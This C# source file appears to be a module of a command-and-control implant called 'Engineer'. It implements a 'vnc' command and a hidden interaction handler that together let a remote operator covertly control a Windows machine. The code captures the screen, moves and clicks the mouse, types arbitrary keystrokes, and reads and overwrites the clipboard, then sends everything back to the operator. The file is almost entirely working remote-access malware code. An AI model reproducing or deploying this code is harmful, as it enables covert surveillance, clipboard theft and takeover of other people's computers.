using DynamicEngLoading;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using System.Threading.Tasks;
using WindowsInput;
using WindowsInput.Native;
using System.Threading;
using Timer = System.Threading.Timer;

namespace Engineer.Commands
{
    internal class vnc : EngineerCommand
    {
        public override string Name => "vnc";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                VncInteractionResponse vncResp = new VncInteractionResponse();
                vncResp.SessionID = task.Id;
                vncResp.InteractionEvent = VncInteractionEvent.View;
                vncResp.ClipboardContent = "";
                var screenMap = HandleVNCClientInteraction.CaptureScreen();
                vncResp.ScreenContent = screenMap;
                Console.WriteLine($"vnc init done");
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(vncResp, task, EngTaskStatus.Running, TaskResponseType.VncInteractionEvent);
                //using a timer every 100ms
                Timer timer = null;
                //if (timer is null)
                //{
                //    timer = new Timer(new TimerCallback(async _ =>
                //    {
                //        if (meta != null)
                //        {
                //            if (meta.IsSessionRunning && meta.LastHeartbeatRequest.AddMilliseconds(10000) < DateTime.UtcNow)
                //            {
                //                meta.LastHeartbeatRequest = DateTime.UtcNow;
                //                await SendHeartbeat();
                //            }
                //        }
                //    }), null, 0, 100);
                //}
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"{ex.Message}", task, EngTaskStatus.Failed, TaskResponseType.String);
            }

        }
        
    }

    public class HandleVNCClientInteraction : EngineerCommand
    {
        public override string Name => "HandleVNCClientInteraction";
        public override bool IsHidden => true;

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                task.Arguments.TryGetValue("/sessionid", out string sessionId);
                VncInteractionResponse vncResp = new VncInteractionResponse();
                vncResp.SessionID = sessionId;
                vncResp.ClipboardContent = "";
                task.Arguments.TryGetValue("/interactionEvent", out string eventId);
                vncResp.InteractionEvent = (VncInteractionEvent)Enum.Parse(typeof(VncInteractionEvent), eventId);
                var screenBounds = Screen.PrimaryScreen.Bounds;
                var screenWidth = screenBounds.Width;
                var screenHeight = screenBounds.Height;

                vncResp.ScreenWidth = screenWidth;
                vncResp.ScreenHeight = screenHeight;

                var inputSimulator = new InputSimulator();



                if (eventId.Equals(VncInteractionEvent.View.ToString()))
                {
                    Console.WriteLine($"heartbeat");
                    var screenMap = CaptureScreen();
                    vncResp.ScreenContent = screenMap;
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(vncResp, task, EngTaskStatus.Complete, TaskResponseType.VncInteractionEvent);
                    return;
                }

                else if (eventId.Equals(VncInteractionEvent.MouseMove.ToString()))
                {
                    task.Arguments.TryGetValue("/x", out string xstring);
                    task.Arguments.TryGetValue("/y", out string ystring);

                    double clientX = Double.Parse(xstring);
                    double clientY = Double.Parse(ystring);
                    // For Mouse Move
                    Console.WriteLine($"X: {clientX} Y: {clientY}");
                    inputSimulator.Mouse.MoveMouseToPositionOnVirtualDesktop(clientX, clientY);
                    var screenMap = CaptureScreen();
                    vncResp.ScreenContent = screenMap;
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(vncResp, task, EngTaskStatus.Complete, TaskResponseType.VncInteractionEvent);

                }
                else if (eventId.Equals(VncInteractionEvent.MouseClick.ToString()))
                {
                    task.Arguments.TryGetValue("/x", out string xstring);
                    task.Arguments.TryGetValue("/y", out string ystring);
                    task.Arguments.TryGetValue("/button", out string btnString);

                    double clientX = Double.Parse(xstring);
                    double clientY = Double.Parse(ystring);
                    long button = long.Parse(btnString);

                    // Calculate the absolute X and Y
                    var absoluteX = (clientX / screenWidth) * 65535;
                    var absoluteY = (clientY / screenHeight) * 65535;

                    Console.WriteLine($"X: {absoluteX} Y: {absoluteY} Button: {button}");
                    inputSimulator.Mouse.MoveMouseToPositionOnVirtualDesktop(absoluteX, absoluteY);
                    // For Mouse Click
                    if (button == 0) // Left Button
                        inputSimulator.Mouse.LeftButtonClick();
                    else if (button == 2) // Right Button
                        inputSimulator.Mouse.RightButtonClick();
                    var screenMap = CaptureScreen();
                    vncResp.ScreenContent = screenMap;
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(vncResp, task, EngTaskStatus.Complete, TaskResponseType.VncInteractionEvent);

                }
                else if (eventId.Equals(VncInteractionEvent.clipboard.ToString()))
                {
                    string clipboardContent = Clipboard.GetText();
                    vncResp.ClipboardContent = clipboardContent;
                    var screenMap = CaptureScreen();
                    vncResp.ScreenContent = screenMap;
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(vncResp, task, EngTaskStatus.Complete, TaskResponseType.VncInteractionEvent);

                }
                else if (eventId.Equals(VncInteractionEvent.clipboardPaste.ToString()))
                {
                    task.Arguments.TryGetValue("/text", out string text);
                    string clipboardContent = Clipboard.GetText();
                    // For Setting Clipboard Content
                    Clipboard.SetText(text);

                }
                else if (eventId.Equals(VncInteractionEvent.KeySend.ToString()))
                {
                    task.Arguments.TryGetValue("/text", out string text);
                    Console.WriteLine($"Text: {text}");
                    inputSimulator.Keyboard.TextEntry(text);
                    var screenMap = CaptureScreen();
                    vncResp.ScreenContent = screenMap;
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(vncResp, task, EngTaskStatus.Complete, TaskResponseType.VncInteractionEvent);
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"{ex.Message}", task, EngTaskStatus.Failed, TaskResponseType.String);
            }
            
        }

        public static byte[] CaptureScreen()
        {
            var screenBounds = Screen.PrimaryScreen.Bounds;
            var bitmap = new Bitmap(screenBounds.Width, screenBounds.Height);

            using (var graphics = Graphics.FromImage(bitmap))
            {
                graphics.CopyFromScreen(Point.Empty, Point.Empty, screenBounds.Size);
            }

            var memoryStream = new MemoryStream();
            bitmap.Save(memoryStream, ImageFormat.Png);
            memoryStream.Position = 0;
            byte[] screenData = memoryStream.ToArray();
            return screenData;
        }


    }
}
